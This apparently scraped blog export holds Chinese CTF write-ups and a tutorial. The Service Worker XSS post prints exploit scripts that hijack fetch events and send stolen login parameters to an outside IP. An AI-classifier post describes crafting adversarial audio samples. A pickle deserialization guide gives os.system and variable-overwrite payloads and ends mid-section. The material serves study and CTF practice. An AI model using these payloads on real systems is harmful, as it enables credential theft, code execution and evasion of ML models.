Appcache用来处理网站的离线缓存，可以通过manifest文件指定浏览器缓存哪些文件以供离线访问。但Appcache有相当多的缺陷，对于整站中的多页缓存来说支持比较差，而Service Worker用来作为其替代。 Service Worker是浏览器在后台运行的脚本，与web页面分离，以更好地支持不需要web页面或用户交互的功能。也可以将其理解为一个介于客户端和服务端之间的代理服务器，拥有拦截请求、修改返回内容的权力。可以用来缓存并处理离线网页（用来XSS）。 Service Workers 要求必须在 HTTPS 下才能运行。为了便于本地开发，localhost 也被浏览器认为是安全源。 Service Workers没有访问 DOM 的能力。 注册Service Worker 要使用SW，需要先注册，有两种方法注册SW：1. 通过JS；2. 通过link标签引入外部js 1234567891011if ('serviceWorker' in navigator) &#123; navigator.serviceWorker.register('/sw-test/sw.js', &#123; scope: '/sw-test/' &#125;).then(function(reg) &#123; // registration worked console.log('Registration succeeded. Scope is ' + reg.scope); &#125;).catch(function(error) &#123; // registration failed console.log('Registration failed with ' + error); &#125;);&#125; 1&lt;link rel=\"serviceworker\" href=\"/sw.js\"&gt; 需要注意的是 navigator.serviceWorker.register 中的参数 首先，第一个参数（ scriptURL ）只能为本站中的JS脚本（并且必须是 HTTPS 或 localhost ，且这个脚本的 Content-Type 必须是 text/javascript 或者其等价类型）； 第二个参数 scope 则限定了Service Worker访问的资源的名称空间（如本例中只能访问 /sw-test/ 的子路径），并且， scope 参数不能设置为第一个参数的上层路径（ scope 范围必须要小于 Service Worker 脚本本身的路径范围），几个例子： 12345无效：\"/assets/js/sw.js\",&#123;scope: \"https://other.example.com/\"&#125;无效：\"/assets/js/sw.js\", &#123;scope: \"/assets/\"&#125;无效：\"/assets/js/sw.js\", &#123;scope: \"/assets/css/\"&#125;有效：\"/assets/js/sw.js\", &#123;scope: \"/assets/js/\"&#125;有效：\"/assets/js/sw.js\", &#123;scope: \"/assets/js/sub/\"&#125; 构造恶意register 从上文可以看出，Service Worker有诸多限制，所以利用起来也比较局限。 一种利用方式：首先发现本站的jsonp（或者有本站的js文件上传点，但这种情况比较少），以作为sw脚本url源。 接一段lightless师傅的引用： 该接口的路径越浅越好，最好在根目录下。很明显 http://localhost/time.jsonp?callback= 要优于 http://localhost/a/b/c/time.jsonp?callback= ，因为如果后者作为 Service Worker 的脚本时， scope 只能为 /a/b/c/ 下的路径，而前者可以控制整个域下的内容。 有了这个JSONP，使用 importScripts 就可以在SW注册时引入任意https脚本： importScripts('https://my_site.com/my_evil.js'); 利用脚本： 123456789101112131415//SW脚本this.addEventListener('fetch', function(event) &#123; var url = event.request.clone(); //获得用户请求 console.log('url: ', url); var body = '&lt;script&gt;alert(\"test\")&lt;/script&gt;'; var init = &#123; headers: &#123; \"Content-Type\": \"text/html\" &#125; &#125;; if (url.url === 'http://localhost/sw/target.html') &#123;//要访问的url（https或localhost） var res = new Response(body, init); event.respondWith(res.clone()); //篡改返回结果 &#125;&#125;); 原理：通过监听 fetch 事件，截获用户的请求，篡改返回，向返回的页面上嵌入恶意的JS脚本。 Service Worker有效时间 在每个Service Worker授权24小时后（用PC时钟确定时间），原先的HTTP缓存将被清除。脚本需要被重新注册以正常使用，否则会被摧毁。 利用1：XSS持久化、拓展XSS攻击面 1importScripts('https://my_site.com/sw.js');//用于注册恶意脚本，通过jsonp或js上传调用importScripts从而引入外部JS 1234567// sw.js（SW恶意脚本）onfetch=e=&gt;&#123;//劫持fetch事件，即浏览器在子域下的每一次访问都会触发 body = '&lt;script&gt;alert(document.domain)&lt;/script&gt;'; init =&#123;headers:&#123;'content-type':'text/html'&#125;&#125;; e.respondWith(new Response(body,init));&#125; 1234567891011// sw.js；与上一个类似this.addEventListener('fetch', function (event) &#123; var url = event.request.clone(); console.log('url: ', url); var body = '&lt;script&gt;alert(\"test\")&lt;/script&gt;'; var init = &#123;headers: &#123;\"Content-Type\": \"text/html\"&#125;&#125;; if (url.url === 'http://localhost/sw/target.html') &#123; var res = new Response(body, init); event.respondWith(res.clone()); &#125;&#125;); 利用2：跨域XSS 这便是本题的利用思路了，首先看条件：若另一个页面存在跨域操作（如：document.domain=&quot;xxx.xxx&quot;），则可以跨该域进行XSS。 再引用一段lightless师傅的博客： 假设我们在 A.lightless.me 上发现了 XSS，想要横向移动到 secret.lightless.me 上。当 secret.lightless.me 上存在跨域行为的时候，例如 document.domain = 'lightless.me' ，我们可以通过 XSS 漏洞嵌入一个 iframe 标签，以此给 secret.lightless.me 域下植入 Service Worker （前提是 secret.lightless.me 域下存在一个 JSONP 或是有可以返回 Service Worker 脚本的地方）。通过这种方法，即便 secret.lightless.me 域内没有 XSS，也可以被植入恶意的 Service Worker 。 理解一下：我们在A.lightless.me上插入一个secret.lightless.me域（secret.lightless.me域下存在跨域行为和JSONP或js文件上传）下的iframe，并通过JSONP为该iframe注册恶意SW，由于该页面跨域了，所以A.lightless.me页面的iframe可以访问其内容，能够成功为secret.lightless.me注册恶意SW。 在本题中，首先诱导受害者访问： 1https://xss.hardxss.xhlj.wetolink.com/login?callback=jsonp(%22https://testjs--hachp1.repl.co/1.js%22);// 此处会触发xss.hardxss.xhlj.wetolink.com/login下的DOM XSS，从而引入并执行1.js 1234567891011//1.js（iframe跨域、注册跨域下的SW）document.domain = \"hardxss.xhlj.wetolink.com\";var iff = document.createElement('iframe');//构造iframe，指向跨域页面iff.src = 'https://auth.hardxss.xhlj.wetolink.com/';//此页面存在跨域操作iff.addEventListener(\"load\", function()&#123; iffLoadover(); &#125;);document.body.appendChild(iff);exp = `navigator.serviceWorker.register(\"/api/loginStatus?callback=importScripts('//testjs--hachp1.repl.co/2.js')//\")`;//使用JSONP注册SW，在JSONP内调用importscripts引入外部脚本function iffLoadover()&#123; iff.contentWindow.eval(exp);&#125; 在1.js中，我们首先跨域以访问同样跨域的https://auth.hardxss.xhlj.wetolink.com，这种跨域方法在实际开发中很常见，为了使数据能够跨域传输，开发者常常把两个不同子域的document.domain设置为共同的父域，通过iframe就能跨域操作，但也带来了安全隐患。此时，1.js就可以对https://auth.hardxss.xhlj.wetolink.com进行操作了。然后我们构造一个iframe指向https://auth.hardxss.xhlj.wetolink.com，并在其上注册SW（此处省去了scope参数，使用默认的最大子路径作为参数），此SW使用JSONP与importScripts结合加载2.js作为SW脚本。 12345678//2.js（SW脚本，必须通过JSONP或JS上传引入）this.addEventListener('fetch', function (event) &#123; var body = \"&lt;script&gt;location='http://129.204.230.95:8888/'+location.search;&lt;/script&gt;\";//通过GET请求传参，此处劫持请求并将其带出 var init = &#123;headers: &#123;\"Content-Type\": \"text/html\"&#125;&#125;; var res = new Response(body, init); event.respondWith(res.clone());&#125;); 2.js是SW脚本，在2.js中，我们劫持了fetch事件，并将请求传给我们的服务器，从而在管理员登陆时劫持并窃取管理员密码，达到利用目的。拿到密码后，登录网页即可拿到flag。需要注意的一点是，由于JSONP为https://auth.hardxss.xhlj.wetolink.com/api/loginStatus?callback=xxx，我们只能劫持受害者在https://auth.hardxss.xhlj.wetolink.com/api/的子域下的请求；而用户登陆的url为https://auth.hardxss.xhlj.wetolink.com/api/loginVerify?adminname=xxx&amp;adminpwd=xxx，恰好在该子域下，所以利用才能成功。可以看出SW的可利用路径是非常苛刻的。 真实情况下的案例：百度漏洞报告：埋雷式攻击，悄无声息获取用户百度登录密码 Service Worker防御措施 当注册SW时，会发出包含 Service-Worker: script http头的请求，可以在服务端拒绝非SW Script却又包含该头的请求以进行防范。 总结 让我们梳理一下，考虑一些细节，整道题主要涉及到四个url： DOM XSS（https://xss.hardxss.xhlj.wetolink.com/login） JSONP（https://auth.hardxss.xhlj.wetolink.com/api/loginStatus） 跨域页面（https://auth.hardxss.xhlj.wetolink.com） 登录验证api（https://auth.hardxss.xhlj.wetolink.com/api/loginVerify） 最后结合一张networking截图理解： 注意到跨域页面上只有一个光秃秃的跨域操作，并没有其他操作，但作为媒介用以设置其子域-登录验证api上的SW脚本（设置脚本时访问的是跨域页面而没有访问劫持页面） 利用条件：1.baidu.com上发现了XSS，2.baidu.com上存在跨域操作：document.domain = 'baidu.com'并且子域下存在JSONP（路径需要跟盗取的信息页面在同一子域）或能够上传js的地方，就可以完成JSONP子域下的持久化XSS劫持。 最后几点： JSONP决定了可以盗取的页面子域 可以用来劫持请求，并直接盗取请求参数，这是其他XSS不能办到的 持久化XSS 扩大XSS到SW脚本子域 参考资料 XSS With Service Worker 基于Service Worker 的XSS攻击面拓展 如何利用/防御 Service Worker TCTF/0CTF2018 h4x0rs.space Writeup 2020西湖论剑部分web_wp 西湖论剑 WP-Nu1L 百度漏洞报告：埋雷式攻击，悄无声息获取用户百度登录密码","categories":[{"name":"Web安全","slug":"Web安全","permalink":"https://hachp1.github.io/categories/Web安全/"}],"tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://hachp1.github.io/tags/Web安全/"}]},{"title":"WMCTF2020 两道AI相关题目WP","slug":"WMCTF2020-AI题WP","date":"2020-08-14T14:17:50.000Z","updated":"2025-02-06T15:11:51.188Z","comments":true,"path":"posts/机器学习/20200814-wm2020.html","link":"","permalink":"https://hachp1.github.io/posts/机器学习/20200814-wm2020.html","excerpt":"WMCTF2020 两道AI相关题目WP wmctf2020 两道AI相关题目WP 前言 Performance_artist CRC校验 如何“识别”字母 Performance_artist解题过程 总结 Music_game_2 题目解读 Music_game_2解题过程 总结 解题脚本","text":"WMCTF2020 两道AI相关题目WP wmctf2020 两道AI相关题目WP 前言 Performance_artist CRC校验 如何“识别”字母 Performance_artist解题过程 总结 Music_game_2 题目解读 Music_game_2解题过程 总结 解题脚本 前言 最近忙着搞论文的事情，已经有一段时间没有更新博客了；但是今年的wmctf2020中出现了两道AI相关的题目，吸引了我的目光。本来我是没有准备打这次比赛的，看到群里有大哥在说比赛有机器学习题目，这一下子引起了我的兴趣，不说了，干它就完事。 其实说的两道AI题目，实际用到AI技术的只有第二题。 Performance_artist 题目给出了一张拼接图片，并提示将flag以十六进制的手写形式储存在图片里，所以需要将图片“识别”为对应的数字或字母。 CRC校验 首先，图片显示不全，需要根据crc校验还原其高度，经过还原后的图片： attachment.png 如何“识别”字母 接触过机器学习的师傅对mnist数据集一定十分熟悉，这张图一眼就能看出mnist的痕迹，但是mnist是没有字母的。在网上搜了一下，发现是emnist数据集中的字母（mnist数据集的拓展数据集） 看到这个图，很多人第一时间想到的是训练一个神经网络来识别，但是神经网络识别跟肉眼识别差不多甚至效果更差，群里已经有师傅肉眼识别过了，发现不太行。这一点也卡了我一些时间。 后来一想：这图既然是使用emnist和mnist数据集中的图片拼接成的，那么直接去数据集中寻找标准答案不就可以了吗。 Performance_artist解题过程 接下来就好办了，参考mnist和emnist数据集官网的教程，直接下载原数据进行解析。能够读取数据集之后，我将题目中的图片按照像素的16进制储存为字符串，然后同样的，将原数据集中所有图片都存为16进制-label的key-value键值对。然后尝试解析了一下，能出结果了，解析出一个zip。这里有个坑：emnist数据集解析时横纵坐标颠倒了，需要再倒过来才行（这个点有点坑，我被坑了不少时间）；解题完整的脚本在本文文末，两个图像字符串化的关键代码为： 123456789101112def np2str(np_image): tmp = '' for i in np_image: tmp += hex(int(i))[2:] return tmpdef img2str(image): tmp = '' np_img = np.array(image).reshape(-1) for i in np_img: tmp += hex(int(i))[2:] return tmp 直接解压zip，报错说有密码，套娃了，直接伪加密解压成功： zip 提示brainfxxk编码，解码后得到flag： flag 总结 此题主要考做题者对机器学习数据集的熟练度，如果对mnist数据集比较熟悉，还是能够想到直接去原数据集找图片的。另外，此题还套娃了几层。 Music_game_2 这道题很有意思，坦克大战移动坦克。我没做 Music_game_1 ，是听群里有师傅说是AI题我才看的。看群里师傅说 Music_game_1 要标准的英式发音来移动坦克走迷宫，感觉挺有意思的。 题目解读 题目给出了一个网页，一个机器学习检测的源码、训练好的机器学习模型和一个left.wav的声音源。机器学习检测源码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354import numpy as npimport osimport librosa, librosa.displayfrom tensorflow import kerasdef get_wav_mfcc(wav_path): y, sr = librosa.load(wav_path,sr=None) data=librosa.feature.mfcc(y,sr=sr) data=np.array(data) '''to unified format''' while len(data[0])&gt;30: data=np.delete(data,-1,axis=1) data=np.delete(data,0,axis=1) while len(data[0])&lt;30: data=np.insert(data,-1,values=data.T[-1],axis=1) return data.Tdef checkdifferent(path): mfcc1=get_wav_mfcc('example.wav') mfcc2=get_wav_mfcc(path) if np.mean(np.abs(mfcc1-mfcc2))&lt;4: return True else: return Falsemodel = keras.models.load_model('model.h5')def detect(path): ret=model.predict(get_wav_mfcc(path).reshape(1,30,20)) return (ret.max(),ret.argmax())if __name__ == \"__main__\": path='yours.wav' try: if not checkdifferent(path): print('sorry,it is too different with example.wav') exit() (num,lable)=detect(path) except: print('ERROR') exit() if num&lt;0.9: print(\"I can't detect with certainty\") exit() if lable==0: print('up') elif lable==1: print('left') elif lable==2: print('down') elif lable==3: print('right') print(num) 给出的机器学习检测源码是一个将音频分类为上下左右四类的分类器，输出四个类别的概率。并且要求音源与给出的left.wav满足范式： 1np.mean(np.abs(mfcc1-mfcc2))&lt;4 还要输出的概率大于90%： 123if num&lt;0.9: print(\"I can't detect with certainty\") exit() 我们需要通过向网页发送音频文件来移动坦克，使之走迷宫并到达目的地，而后台使用这个机器学习分类器来识别我们给出的音频。意图很明显，我们需要找到left.wav的其他三个方向（上、下、右）的对抗样本，从而移动坦克，属于有目标逃逸攻击。 Music_game_2解题过程 由于我之前接触过对抗样本，拿现成的代码来跑是很快的，但是我没做过音频的，此处生成的对抗样本是直接输入机器学习模型的向量。卡在了将对抗样本（mfcc特征）逆向转化为wav文件这步。卡了很久，查了很多资料才发现，最新的librosa库支持mfcc特征逆向转化为wav（就很难受）。接下来尝试fgm有目标攻击，直接调了三个方向的目标，得到了三个对抗样本。经测试，三个对抗样本都满足范式的要求，并且置信度大于90%。 接下来到了最兴奋的环境，移动坦克！写个脚本传给网页，移动坦克走迷宫。坦克成功移动了： 坦克移动了 刚开始我还认真数了一张地图的移动次数和方向，但后来发现坦克的地图每个session都不一样，很难受。最后发现目的地总是在地图的右下角，我就先一通绕，最后几步无脑下下下右右右，终于拿到了flag： 拿到了flag 拿到flag的时候比赛已经快结束了，拿了个三血，挺激动的，整个题目的解题脚本在文末给出了地址。 总结 这道题是一道很有意思的题目，结合了坦克大战游戏、Web脚本编写和对抗样本三个元素，游戏的背景让这题很有趣，并且较创新地考察了对抗样本技术。 解题脚本 最后，附上这两道AI相关的题目的解题脚本地址：https://github.com/HACHp1/WMCTF2020_MISC_AI_WP","categories":[{"name":"机器学习","slug":"机器学习","permalink":"https://hachp1.github.io/categories/机器学习/"}],"tags":[{"name":"机器学习","slug":"机器学习","permalink":"https://hachp1.github.io/tags/机器学习/"}]},{"title":"pickle反序列化初探","slug":"pickle反序列化初探","date":"2020-03-28T04:25:21.000Z","updated":"2025-02-06T15:11:50.908Z","comments":true,"path":"posts/Web安全/20200328-pickle.html","link":"","permalink":"https://hachp1.github.io/posts/Web安全/20200328-pickle.html","excerpt":"pickle反序列化初探 本文首发于先知社区，链接：https://xz.aliyun.com/t/7436 pickle反序列化初探 前言 基本知识 pickle简介 可序列化的对象 object.__reduce__() 函数 pickle过程详细解读 opcode简介 opcode版本 pickletools 漏洞利用 利用思路 初步认识：pickle EXP的简单demo 如何手写opcode 常用opcode解析 拼接opcode 全局变量覆盖 函数执行 实例化对象 pker的使用（推荐） 注意事项 CTF实战 做题之前：了解pickle.Unpickler.find_class() Code-Breaking:picklecode watevrCTF-2019:Pickle Store 高校战疫网络安全分享赛:webtmp pker使用说明 简介 pker能做的事 使用方法与示例 pker：全局变量覆盖 pker：函数执行 pker：实例化对象 手动辅助 pker：CTF实战 Code-Breaking: picklecode BalsnCTF:pyshv1 BalsnCTF:pyshv2 BalsnCTF:pyshv3 watevrCTF-2019: Pickle Store SUCTF-2019:guess_game 高校战疫网络安全分享赛: webtmp 后记 参考资料","text":"pickle反序列化初探 本文首发于先知社区，链接：https://xz.aliyun.com/t/7436 pickle反序列化初探 前言 基本知识 pickle简介 可序列化的对象 object.__reduce__() 函数 pickle过程详细解读 opcode简介 opcode版本 pickletools 漏洞利用 利用思路 初步认识：pickle EXP的简单demo 如何手写opcode 常用opcode解析 拼接opcode 全局变量覆盖 函数执行 实例化对象 pker的使用（推荐） 注意事项 CTF实战 做题之前：了解pickle.Unpickler.find_class() Code-Breaking:picklecode watevrCTF-2019:Pickle Store 高校战疫网络安全分享赛:webtmp pker使用说明 简介 pker能做的事 使用方法与示例 pker：全局变量覆盖 pker：函数执行 pker：实例化对象 手动辅助 pker：CTF实战 Code-Breaking: picklecode BalsnCTF:pyshv1 BalsnCTF:pyshv2 BalsnCTF:pyshv3 watevrCTF-2019: Pickle Store SUCTF-2019:guess_game 高校战疫网络安全分享赛: webtmp 后记 参考资料 前言 最近遇到有关pickle的CTF题，虽然被很多师傅们玩的差不多了，但是我也仔细学习了一波，尽可能详细地总结了pickle反序列化的相关知识。整篇文章介绍了pickle的基本原理、PVM、opcode解析的详细过程、CTF赛题实战和pker工具的使用，希望这篇文章能给初学pickle反序列化知识的童鞋带来帮助。文章内容比较多，如果文章中出现了错误请师傅们指正。 基本知识 pickle简介 与PHP类似，python也有序列化功能以长期储存内存中的数据。pickle是python下的序列化与反序列化包。 python有另一个更原始的序列化包marshal，现在开发时一般使用pickle。 与json相比，pickle以二进制储存，不易人工阅读；json可以跨语言，而pickle是Python专用的；pickle能表示python几乎所有的类型（包括自定义类型），json只能表示一部分内置类型且不能表示自定义类型。 pickle实际上可以看作一种独立的语言，通过对opcode的更改编写可以执行python代码、覆盖变量等操作。直接编写的opcode灵活性比使用pickle序列化生成的代码更高，有的代码不能通过pickle序列化得到（pickle解析能力大于pickle生成能力）。 可序列化的对象 None 、 True 和 False 整数、浮点数、复数 str、byte、bytearray 只包含可封存对象的集合，包括 tuple、list、set 和 dict 定义在模块最外层的函数（使用 def 定义，lambda 函数则不可以） 定义在模块最外层的内置函数 定义在模块最外层的类 __dict__ 属性值或 __getstate__() 函数的返回值可以被序列化的类（详见官方文档的Pickling Class Instances） object.__reduce__() 函数 在开发时，可以通过重写类的 object.__reduce__() 函数，使之在被实例化时按照重写的方式进行。具体而言，python要求 object.__reduce__() 返回一个 (callable, ([para1,para2...])[,...]) 的元组，每当该类的对象被unpickle时，该callable就会被调用以生成对象（该callable其实是构造函数）。 在下文pickle的opcode中， R 的作用与 object.__reduce__() 关系密切：选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数。其实 R 正好对应 object.__reduce__() 函数， object.__reduce__() 的返回值会作为 R 的作用对象，当包含该函数的对象被pickle序列化时，得到的字符串是包含了 R 的。 pickle过程详细解读 pickle解析依靠Pickle Virtual Machine (PVM)进行。 PVM涉及到三个部分：1. 解析引擎 2. 栈 3. 内存： 解析引擎：从流中读取 opcode 和参数，并对其进行解释处理。重复这个动作，直到遇到 . 停止。最终留在栈顶的值将被作为反序列化对象返回。 栈：由Python的list实现，被用来临时存储数据、参数以及对象。 memo：由Python的dict实现，为PVM的生命周期提供存储。说人话：将反序列化完成的数据以 key-value 的形式储存在memo中，以便后来使用。 为了便于理解，我把BH讲稿中的相关部分制成了动图，PVM解析 str 的过程动图： PVM解析str的过程 PVM解析 __reduce__() 的过程动图： PVM解析__reduce__()的过程 opcode简介 opcode版本 pickle由于有不同的实现版本，在py3和py2中得到的opcode不相同。但是pickle可以向下兼容（所以用v0就可以在所有版本中执行）。目前，pickle有6种版本。 12345678910111213import picklea=&#123;'1': 1, '2': 2&#125;print(f'# 原变量：&#123;a!r&#125;')for i in range(4): print(f'pickle版本&#123;i&#125;',pickle.dumps(a,protocol=i))# 输出：pickle版本0 b'(dp0\\nV1\\np1\\nI1\\nsV2\\np2\\nI2\\ns.'pickle版本1 b'&#125;q\\x00(X\\x01\\x00\\x00\\x001q\\x01K\\x01X\\x01\\x00\\x00\\x002q\\x02K\\x02u.'pickle版本2 b'\\x80\\x02&#125;q\\x00(X\\x01\\x00\\x00\\x001q\\x01K\\x01X\\x01\\x00\\x00\\x002q\\x02K\\x02u.'pickle版本3 b'\\x80\\x03&#125;q\\x00(X\\x01\\x00\\x00\\x001q\\x01K\\x01X\\x01\\x00\\x00\\x002q\\x02K\\x02u.' pickle3版本的opcode示例： 12345678910# 'abcd'b'\\x80\\x03X\\x04\\x00\\x00\\x00abcdq\\x00.'# \\x80：协议头声明 \\x03：协议版本# \\x04\\x00\\x00\\x00：数据长度：4# abcd：数据# q：储存栈顶的字符串长度：一个字节（即\\x00）# \\x00：栈顶位置# .：数据截止 pickle0版本的部分opcode表格： Opcode Mnemonic Data type loaded onto the stack Example S STRING String S’foo’ V | UNICODE | Unicode | Vfo I | INTEGER | Integer | I42| … | … | … | … | 本表格截取了BH的pdf上的部分内容，完整表格可以直接在原pdf中找到。 pickletools 使用pickletools可以方便的将opcode转化为便于肉眼读取的形式 12345678910111213141516import pickletoolsdata=b\"\\x80\\x03cbuiltins\\nexec\\nq\\x00X\\x13\\x00\\x00\\x00key1=b'1'\\nkey2=b'2'q\\x01\\x85q\\x02Rq\\x03.\"pickletools.dis(data) 0: \\x80 PROTO 3 2: c GLOBAL 'builtins exec' 17: q BINPUT 0 19: X BINUNICODE \"key1=b'1'\\nkey2=b'2'\" 43: q BINPUT 1 45: \\x85 TUPLE1 46: q BINPUT 2 48: R REDUCE 49: q BINPUT 3 51: . STOPhighest protocol among opcodes = 2 漏洞利用 利用思路 任意代码执行或命令执行。 变量覆盖，通过覆盖一些凭证达到绕过身份验证的目的。 初步认识：pickle EXP的简单demo 123456789101112import pickleimport osclass genpoc(object): def __reduce__(self): s = \"\"\"echo test &gt;poc.txt\"\"\" # 要执行的命令 return os.system, (s,) # reduce函数必须返回元组或字符串e = genpoc()poc = pickle.dumps(e)print(poc) # 此时，如果 pickle.loads(poc)，就会执行命令 变量覆盖 12345678910111213import picklekey1 = b'321'key2 = b'123'class A(object): def __reduce__(self): return (exec,(\"key1=b'1'\\nkey2=b'2'\",))a = A()pickle_a = pickle.dumps(a)print(pickle_a)pickle.loads(pickle_a)print(key1, key2) 如何手写opcode 在CTF中，很多时候需要一次执行多个函数或一次进行多个指令，此时就不能光用 __reduce__ 来解决问题（reduce一次只能执行一个函数，当exec被禁用时，就不能一次执行多条指令了），而需要手动拼接或构造opcode了。手写opcode是pickle反序列化比较难的地方。 在这里可以体会到为何pickle是一种语言，直接编写的opcode灵活性比使用pickle序列化生成的代码更高，只要符合pickle语法，就可以进行变量覆盖、函数执行等操作。 根据前文不同版本的opcode可以看出，版本0的opcode更方便阅读，所以手动编写时，一般选用版本0的opcode。下文中，所有opcode为版本0的opcode。 常用opcode解析 为了充分理解栈的作用，强烈建议一边看动图一边学习opcode的作用： PVM解析__reduce__()的过程 由于pickle库中的注释不是很详细，网上的其他资料也没有具体地把栈和memo上的变化讲清楚，以下的每个opcode的操作都是我经过实验验证并且尽可能将栈和memo上的变化解释清楚，常用的opcode如下： opcode 描述 具体写法 栈上的变化 memo上的变化 c 获取一个全局对象或import一个模块（注：会调用import语句，能够引入新的包） c[module] 获得的对象入栈 无 o 寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象） o 这个过程中涉及到的数据都出栈，函数的返回值（或生成的对象）入栈 无 i 相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象） i[module] 这个过程中涉及到的数据都出栈，函数返回值（或生成的对象）入栈 无 N 实例化一个None N 获得的对象入栈 无 S 实例化一个字符串对象 S’xxx’（也可以使用双引号、\\’等python字符串形式） 获得的对象入栈 无 V 实例化一个UNICODE字符串对象 Vxxx 获得的对象入栈 无 I 实例化一个int对象 Ixxx 获得的对象入栈 无 F 实例化一个float对象 Fx.x 获得的对象入栈 无 R 选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数 R 函数和参数出栈，函数的返回值入栈 无 . 程序结束，栈顶的一个元素作为pickle.loads()的返回值 . 无 无 ( 向栈中压入一个MARK标记 ( MARK标记入栈 无 t 寻找栈中的上一个MARK，并组合之间的数据为元组 t MARK标记以及被组合的数据出栈，获得的对象入栈 无 ) 向栈中直接压入一个空元组 ) 空元组入栈 无 l 寻找栈中的上一个MARK，并组合之间的数据为列表 l MARK标记以及被组合的数据出栈，获得的对象入栈 无 ] 向栈中直接压入一个空列表 ] 空列表入栈 无 d 寻找栈中的上一个MARK，并组合之间的数据为字典（数据必须有偶数个，即呈key-value对） d MARK标记以及被组合的数据出栈，获得的对象入栈 无 } 向栈中直接压入一个空字典 } 空字典入栈 无 p 将栈顶对象储存至memo_n pn 无 对象被储存 g 将memo_n的对象压栈 gn 对象被压栈 无 0 丢弃栈顶对象 0 栈顶对象被丢弃 无 b 使用栈中的第一个元素（储存多个属性名: 属性值的字典）对第二个元素（对象实例）进行属性设置 b 栈上第一个元素出栈 无 s 将栈的第一个和第二个对象作为key-value对，添加或更新到栈的第三个对象（必须为列表或字典，列表以数字作为key）中 s 第一、二个元素出栈，第三个元素（列表或字典）添加新值或被更新 无 u 寻找栈中的上一个MARK，组合之间的数据（数据必须有偶数个，即呈key-value对）并全部添加或更新到该MARK之前的一个元素（必须为字典）中 u MARK标记以及被组合的数据出栈，字典被更新 无 a 将栈的第一个元素append到第二个元素(列表)中 a 栈顶元素出栈，第二个元素（列表）被更新 无 e 寻找栈中的上一个MARK，组合之间的数据并extends到该MARK之前的一个元素（必须为列表）中 e MARK标记以及被组合的数据出栈，列表被更新 无 此外， TRUE 可以用 I 表示： b'I01\\n' ； FALSE 也可以用 I 表示： b'I00\\n' ，其他opcode可以在pickle库的源代码中找到。 由这些opcode我们可以得到一些需要注意的地方： 编写opcode时要想象栈中的数据，以正确使用每种opcode。 在理解时注意与python本身的操作对照（比如python列表的append对应a、extend对应e；字典的update对应u）。 c操作符会尝试import库，所以在pickle.loads时不需要漏洞代码中先引入系统库。 pickle不支持列表索引、字典索引、点号取对象属性作为左值，需要索引时只能先获取相应的函数（如getattr、dict.get）才能进行。但是因为存在s、u、b操作符，作为右值是可以的。即“查值不行，赋值可以”。pickle能够索引查值的操作只有c、i。而如何查值也是CTF的一个重要考点。 s、u、b操作符可以构造并赋值原来没有的属性、键值对。 拼接opcode 将第一个pickle流结尾表示结束的 . 去掉，将第二个pickle流与第一个拼接起来即可。 全局变量覆盖 python源码： 12# secret.pyname='TEST3213qkfsmfo' 12345678910111213141516# main.pyimport pickleimport secretopcode='''c__main__secret(S'name'S'1'db.'''print('before:',secret.name)output=pickle.loads(opcode.encode())print('output:',output)print('after:',secret.name) 首先，通过 c 获取全局变量 secret ，然后建立一个字典，并使用 b 对secret进行属性设置，使用到的payload： 12345opcode='''c__main__secret(S'name'S'1'db.''' 函数执行 与函数执行相关的opcode有三个： R 、 i 、 o ，所以我们可以从三个方向进行构造： R ： 1234b'''cossystem(S'whoami'tR.''' i ： 1234b'''(S'whoami'iossystem.''' o ： 1234b'''(cossystemS'whoami'o.''' 实例化对象 实例化对象是一种特殊的函数执行，这里简单的使用 R 构造一下，其他方式类似： 12345678910111213class Student: def __init__(self, name, age): self.name = name self.age = agedata=b'''c__main__Student(S'XiaoMing'S\"20\"tR.'''a=pickle.loads(data)print(a.name,a.age) pker的使用（推荐） pker是由@eddieivan01编写的以仿照Python的形式产生pickle opcode的解析器，可以在https://github.com/eddieivan01/pker下载源码。解析器的原理见作者的paper：通过AST来构造Pickle opcode。 使用pker，我们可以更方便地编写pickle opcode，pker的使用方法将在下文中详细介绍。需要注意的是，建议在能够手写opcode的情况下使用pker进行辅助编写，不要过分依赖pker。 注意事项 pickle序列化的结果与操作系统有关，使用windows构建的payload可能不能在linux上运行。比如： 12345# linux(注意posix):b'cposix\\nsystem\\np0\\n(Vwhoami\\np1\\ntp2\\nRp3\\n.'# windows(注意nt):b'cnt\\nsystem\\np0\\n(Vwhoami\\np1\\ntp2\\nRp3\\n.' CTF实战 做题之前：了解pickle.Unpickler.find_class() 由于官方针对pickle的安全问题的建议是修改find_class()，引入白名单的方式来解决，很多CTF题都是针对该函数进行，所以搞清楚如何绕过该函数很重要。 什么时候会调用find_class()： 从opcode角度看，当出现c、i、b'\\x93'时，会调用，所以只要在这三个opcode直接引入模块时没有违反规则即可。 从python代码来看，find_class()只会在解析opcode时调用一次，所以只要绕过opcode执行过程，find_class()就不会再调用，也就是说find_class()只需要过一次，通过之后再产生的函数在黑名单中也不会拦截，所以可以通过__import__绕过一些黑名单。 下面先看两个例子： 12345678910safe_builtins = &#123;'range','complex','set','frozenset','slice',&#125;class RestrictedUnpickler(pickle.Unpickler): def find_class(self, module, name): # Only allow safe classes from builtins. if module == \"builtins\" and name in safe_builtins: return getattr(builtins, name) # Forbid everything else. raise pickle.UnpicklingError(\"global '%s.%s' is forbidden\" %(module, name)) 12345class RestrictedUnpickler(pickle.Unpickler): def find_class(self, module, name): if module == '__main__': # 只允许__main__模块 return getattr(sys.modules['__main__'], name) raise pickle.UnpicklingError(\"global '%s.%s' is forbidden\" % (module, name)) 第一个例子是官方文档中的例子，使用白名单限制了能够调用的模块为{'range','complex','set','frozenset','slice',}。 第二个例子是高校战疫网络安全分享赛·webtmp中的过滤方法，只允许__main__模块。虽然看起来很安全，但是被引入主程序的模块都可以通过__main__调用修改，所以造成了变量覆盖。 由这两个例子我们了解到，对于开发者而言，使用白名单谨慎列出安全的模块则是规避安全问题的方法；而如何绕过find_class函数内的限制就是pickle反序列化解题的关键。 此外，CTF中的考察点往往还会结合python的基础知识（往往是内置的模块、属性、函数）进行，考察对白名单模块的熟悉程度，所以做题的时候可以先把白名单模块的文档看一看:) Code-Breaking:picklecode 